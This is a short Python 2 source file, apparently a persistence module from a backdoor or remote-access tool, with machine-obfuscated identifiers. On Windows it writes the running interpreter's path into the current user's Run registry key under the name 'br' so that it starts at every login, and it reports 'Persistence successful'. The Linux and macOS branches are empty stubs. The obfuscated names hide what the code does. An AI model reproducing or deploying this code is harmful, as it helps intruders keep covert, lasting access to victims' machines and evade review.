# -*- coding: utf-8 -*-
import sys
def BTuVpVJjEYQMpfUZPfWiUYqqwPuiOYaM():
    import _winreg
    from _winreg import HKEY_CURRENT_USER as HKCU
    GeshnlTZmbMIMNvutDMDXGKQHfVpYZXp = r'Software\Microsoft\Windows\CurrentVersion\Run'
    GcSClFEMjAOoNEdJyDYvMvxmGWuVmSzb = sys.executable
    try:
        KyGSyvGDHwLZdNDsupclkKVbTxCEEidi = _winreg.OpenKey(HKCU, GeshnlTZmbMIMNvutDMDXGKQHfVpYZXp, 0, _winreg.KEY_WRITE)
        _winreg.SetValueEx(KyGSyvGDHwLZdNDsupclkKVbTxCEEidi, 'br', 0, _winreg.REG_SZ, GcSClFEMjAOoNEdJyDYvMvxmGWuVmSzb)
        _winreg.CloseKey(KyGSyvGDHwLZdNDsupclkKVbTxCEEidi)
        return True, 'HKCU Run registry key applied'
    except WindowsError:
        return False, 'HKCU Run registry key failed'
def TWCOeGtPtYaEivKvFEUiDuaqKnMHrRjg():
    return False, 'nothing here yet'
def CXlJVLMBikwtbZNmMBsivumFOcVAQHJW():
    return False, 'nothing here yet'
def YdhlSQqGKFFyGZFIAPpNBTrabuGpkckg(plat_type):
    if plat_type.startswith('win'):
        success, IpSNaMfLPIBeWXQoFemXNGzQetRUfoRM = BTuVpVJjEYQMpfUZPfWiUYqqwPuiOYaM()
    elif plat_type.startswith('linux'):
        success, IpSNaMfLPIBeWXQoFemXNGzQetRUfoRM = TWCOeGtPtYaEivKvFEUiDuaqKnMHrRjg()
    elif plat_type.startswith('darwin'):
        success, IpSNaMfLPIBeWXQoFemXNGzQetRUfoRM = CXlJVLMBikwtbZNmMBsivumFOcVAQHJW()
    else:
        return 'Error, platform unsupported.'
    if success:
        YMGyjOPytDADCtQTHlvArJaBXhupfTQS = 'Persistence successful, {}.'.format(IpSNaMfLPIBeWXQoFemXNGzQetRUfoRM)
    else:
        YMGyjOPytDADCtQTHlvArJaBXhupfTQS = 'Persistence unsuccessful, {}.'.format(IpSNaMfLPIBeWXQoFemXNGzQetRUfoRM)
    return YMGyjOPytDADCtQTHlvArJaBXhupfTQS
